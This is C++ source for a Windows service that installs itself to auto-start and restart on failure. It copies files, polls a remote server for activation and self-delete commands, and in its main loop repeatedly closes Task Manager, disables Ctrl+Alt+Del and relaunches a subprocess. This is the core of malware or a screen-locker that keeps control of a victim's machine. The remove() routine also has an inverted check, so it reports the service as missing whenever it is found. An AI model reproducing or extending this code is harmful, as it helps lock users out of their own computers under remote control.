/*
 *
 *  Gestion du Service Windows
 *
 *
 *  © 2015 - Guillaume Gonnet
 *  License GPLv2
 */



#include "WindowsService.h"
#include "Registry.h"
#include "FilesCopy.h"
#include "SubProcess.h"
#include "Utils.h"



// Init des variables statiques
WindowsService *WindowsService::s_this = NULL;
SERVICE_STATUS WindowsService::s_status;
SERVICE_STATUS_HANDLE WindowsService::s_statusHandle;
HANDLE WindowsService::s_stopServiceEvent = (DWORD) NULL;



// Constructeur
WindowsService::WindowsService()
{
}





bool WindowsService::install(string args)
{

    if (args.empty())
        args = "-service";

    wstring wargs;
    wargs.assign(args.begin(), args.end());


    const unsigned int pathlength = 2048;
    wchar_t path[pathlength];
    wchar_t servicecmd[pathlength];



    // Obtient le chemin de ce .exe
    if( GetModuleFileName( NULL, path, pathlength-(wargs.length()+2) ) == 0 )
    {
        printf("\nErreur: GetModuleFileName()");
        return false;
    }


    // Ajoute les args à la fin de ce chemin
    if( wcslen( path ) + 4 + wargs.length() < pathlength )
        swprintf( servicecmd, pathlength, L"\"%ls\" %ls", path, wargs.c_str() );
    else
        return false;


    // Variables noms
    LPCTSTR serviceName = SERVICE_NAME;
    LPCTSTR displayName = SERVICE_DISPLAY_NAME;


    // Ouvre un Handle sur la SC Manager Database
    SC_HANDLE hsrvmanager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

    if (hsrvmanager == NULL)
        printf("\nErreur: OpenSCManager(), %lu", GetLastError());


    // Création du service...
    SC_HANDLE hservice = CreateService(
        hsrvmanager, // SCManager database
        serviceName, // name of service
        displayName, // service name to display
        SERVICE_ALL_ACCESS, // desired access
        SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, // service type
        SERVICE_AUTO_START, // start type
        SERVICE_ERROR_NORMAL, // error control type
        servicecmd, // service's binary
        NULL, // no load ordering group
        NULL, // no tag identifier
        NULL, // no dependencies, for real telnet there are dependencies lor
        NULL, // LocalSystem account
        NULL  // no password
    );

    if( hservice == NULL)
    {
        if( GetLastError() == ERROR_SERVICE_EXISTS )
            printf("\nLe service existe deja");
        else
            printf("\nLe service n'a pas pu etre cree");

        CloseServiceHandle( hsrvmanager );
        return false;
    }



    // Description du service
    SERVICE_DESCRIPTION description = { SERVICE_DES };
    ChangeServiceConfig2( hservice, SERVICE_CONFIG_DESCRIPTION, &description );



    // Action à faire quand le service s'arrète
    SC_ACTION service_actions;
    service_actions.Delay = 10000;
    service_actions.Type = SC_ACTION_RESTART;


    SERVICE_FAILURE_ACTIONS service_failure_actions;
    service_failure_actions.dwResetPeriod = 0;
    service_failure_actions.lpRebootMsg = NULL;
    service_failure_actions.lpCommand = NULL;
    service_failure_actions.lpsaActions = &service_actions;
    service_failure_actions.cActions = 1;
    ChangeServiceConfig2( hservice, SERVICE_CONFIG_FAILURE_ACTIONS, &service_failure_actions );

    CloseServiceHandle( hservice );
    CloseServiceHandle( hsrvmanager );


    printf("\nLe service a ete cree !");

    return true;

}







bool WindowsService::remove()
{
    bool suc = true;


    // On ouvre la SCM
    SC_HANDLE hsrvmanager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

    if( !hsrvmanager )
    {
        printf("LA SCM n'a pas pu etre ouverte (probleme de droit ?)");
        return false;
    }



    // On ouvre le service
    SC_HANDLE hservice = OpenService( hsrvmanager, m_wname.c_str(), SERVICE_ALL_ACCESS );

    if( hservice != NULL )
    {
        printf("\nLe service est introuvable");
        CloseServiceHandle( hsrvmanager );
        return false;
    }



    SERVICE_STATUS status;

    // Essaie d'arreter le service
    if( ControlService( hservice, SERVICE_CONTROL_STOP, &status ) )
    {
        while( QueryServiceStatus( hservice, &status ) )
        {
            if( status.dwCurrentState != SERVICE_STOP_PENDING )
                break;

            Sleep( 1000 );
        }

        if( status.dwCurrentState != SERVICE_STOPPED )
        {
            printf("\nLe service n'a pas pu etre arrete");
            suc = false;
        }
    }



    // On supprime le service
    if( suc && DeleteService( hservice ) )
    {
        printf("\nService supprime !");
    }
    else
    {
        if( GetLastError() == ERROR_SERVICE_MARKED_FOR_DELETE )
            printf("\nLe service est deja marque comme supprime");
        else
            printf("\nLe service n'a pas pu etre supprime");

        suc = false;
    }

    CloseServiceHandle( hservice );
    CloseServiceHandle( hsrvmanager );

    return suc;
}







// Démarre le service
void WindowsService::start()
{
    _wsystem( (wstring(L"net start ") + wstring(SERVICE_NAME) ).c_str());
}









// Entrée du service
bool WindowsService::runAsService()
{

    // On créer une Table d'Entrée
    SERVICE_TABLE_ENTRY dispatchTable[] =
    {
        { const_cast<wchar_t*>(SERVICE_NAME), (LPSERVICE_MAIN_FUNCTION) serviceMain },
        { NULL, NULL }
    };

    s_this = this;


    // On appelle le Service Manager avec notre table
    return StartServiceCtrlDispatcher( dispatchTable );
}







// Fonction d'init du service
void WINAPI WindowsService::serviceMain( DWORD argc, char **argv )
{

    DWORD context = 1;

    // On définit le Controller du Service
    s_statusHandle = RegisterServiceCtrlHandlerEx(s_this->m_wname.c_str(), serviceCtrl, &context);

    if( s_statusHandle == 0 )
        return;


    // On définit les options du service
    s_status.dwServiceType = SERVICE_WIN32 | SERVICE_INTERACTIVE_PROCESS;
    s_status.dwServiceSpecificExitCode = 0;


    // On enclenche le démarreur...
    if( !reportStatus(SERVICE_START_PENDING, NO_ERROR) )
    {
        reportStatus( SERVICE_STOPPED, 0 );
        return;
    }


    // Event: Stop
    s_stopServiceEvent = CreateEvent( 0, TRUE, FALSE, 0 );


    // On démarre le service
    if( !reportStatus(SERVICE_RUNNING, NO_ERROR) )
    {
        return;
    }


    mainLoop();


    CloseHandle( s_stopServiceEvent );

    // On stop le service
    reportStatus( SERVICE_STOPPED, 0 );

}







// Fonction du Service Controller
DWORD WINAPI WindowsService::serviceCtrl( DWORD _ctrlcode, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext )
{

    switch( _ctrlcode )
    {

        case SERVICE_CONTROL_SHUTDOWN:
        case SERVICE_CONTROL_STOP:
            // Le service doit s'arrêter
            s_status.dwCurrentState = SERVICE_STOP_PENDING;
            SetEvent( s_stopServiceEvent );
            break;


        case SERVICE_CONTROL_INTERROGATE:
            // Service control manager just wants to know our state
            break;


        default:
            // Code inconnu
            break;
    }


    // On dit au Controller ce qu'il doit faire
    reportStatus( s_status.dwCurrentState, NO_ERROR );

    return NO_ERROR;
}







// Service manager status reporting
bool WindowsService::reportStatus( DWORD state, DWORD exitCode)
{
    static DWORD checkpoint = 1;


    // Si le service est en train de démarer
    if( state == SERVICE_START_PENDING )
        s_status.dwControlsAccepted = 0;
    else
        s_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;


    // On met les nouvelles options
    s_status.dwCurrentState = state;
    s_status.dwWin32ExitCode = exitCode;


    // Mise à jour du "check point" pour dire que le service n'est pas mort
    if ( ( state == SERVICE_RUNNING ) || ( state == SERVICE_STOPPED ) )
        s_status.dwCheckPoint = 0;
    else
        s_status.dwCheckPoint = checkpoint++;


    // On dit au Service Manager le nouvel état
    return SetServiceStatus( s_statusHandle, &s_status );
}












// Boucle principale
void WindowsService::mainLoop()
{


    // Si les fichiers n'ont pas été copiés

    if (Registry::getDWORDValue(L"copy") == 0) {


        FilesCopy f;

        if (!f.run()) {

            printf("Erreur: Copy des fichiers");

            s_status.dwCurrentState = SERVICE_STOP_PENDING;
            SetEvent( s_stopServiceEvent );
            return;
        }



        // On créer la clé de registre
        Registry::create();
    }



    // Commande de suppression

    if (GetUrlContent(SERVER_NAME, "mustDelete") == "true") {
        Sleep(5000);
        DeleteAll();
        return;
    }




    // Vérification au serveur (toutes les 4 h)

    bool ok = false;

    do {
        ok = (GetUrlContent(SERVER_NAME, "isActive") == "true");

        if (!ok)
            ok = (WaitForSingleObject( s_stopServiceEvent, 14400000 ) != WAIT_TIMEOUT);

    } while( !ok );




    // Process

    SubProcess process;

    while( WaitForSingleObject( s_stopServiceEvent, 500 ) == WAIT_TIMEOUT )
    {

        // On ferme le gestionnaire de tâches
        CloseTaskMgr();

        // On désactive Ctrl+Alt+Suppr
        DisableCAS();

        // On teste si le process est éteint
        if ( process.isRunning() == false ) {

            if (GetUrlContent(SERVER_NAME, "mustDelete") == "true") {
                Sleep(5000);
                DeleteAll();
                return;
            } else {
                process.start();
            }
        }

    }


}

